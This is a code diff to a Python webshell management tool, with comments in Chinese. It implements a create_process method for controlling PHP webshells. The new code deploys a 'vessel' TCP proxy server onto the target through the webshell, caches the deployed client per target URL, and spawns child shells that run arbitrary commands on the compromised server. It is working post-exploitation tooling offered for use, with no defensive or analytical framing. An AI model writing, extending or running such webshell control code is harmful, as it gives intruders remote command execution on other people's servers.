@@ -862,12 +862,11 @@ class PHPWebshellActions(PHPSessionInterface):
     """PHP session各类工具函数的实现"""
 
     def __init__(self, conn: t.Union[None, dict]):
-        # conn是webshell从前端或者数据库接来的字典，可能是上一个版本，没有添加某项的connection info
-        # 所以其中的任何一项都可能不存在，需要使用get取默认值
         options = conn if conn is not None else {}
-        # for upload file and download file
         self.chunk_size = int(options.get("updownload_chunk_size", 1024 * 16))
         self.max_coro = int(options.get("updownload_max_coroutine", 4))
+        self._conn = conn
+        self.vessel_server_url = options.get("vessel_server_url", None)
 
     # --- 以下是Interface的实现，依赖submit函数 ---
 
@@ -1275,14 +1274,33 @@ class PHPWebshellActions(PHPSessionInterface):
         )
         return await self.submit_http(code)
 
+    _vessel_deployment_cache: t.ClassVar[t.Dict[str, str]] = {}
+
     async def create_process(
         self,
         argv: t.List[str],
         overrides_env: t.Union[t.Dict[str, str], None] = None,
     ) -> "ProcessProtocol":
-        raise NotImplementedError(
-            "PHP session暂不支持创建进程，需要使用当前项目的vessel（TCP代理）启动进程，可能需要增强vessel的实现"
-        )
+        from ..vessel_php.main import start_vessel_server, get_vessel_client
+        from ..vessel_php.process import VesselProcess
+
+        url = self.url
+        client_code = self._vessel_deployment_cache.get(url) if url else None
+        server_session = None
+        if self.vessel_server_url is not None and self._conn is not None:
+            vessel_conn = {**self._conn, "url": self.vessel_server_url}
+            server_session = type(self)(vessel_conn)
+        if client_code is None:
+            client_code = await start_vessel_server(self, server_session=server_session)
+            if url:
+                self._vessel_deployment_cache[url] = client_code
+
+        call = get_vessel_client(self, client_code)
+        cmd = " ".join(argv)
+        shell_key = await call("spawn_child_shell", cmd, overrides_env, timeout=10)
+        if shell_key is None:
+            raise exceptions.TargetRuntimeError("Failed to spawn child shell")
+        return VesselProcess(call, shell_key)
 
     async def submit(self, payload: str) -> str:
         raise NotImplementedError("子类提供这个函数以驱动这些Actions函数")
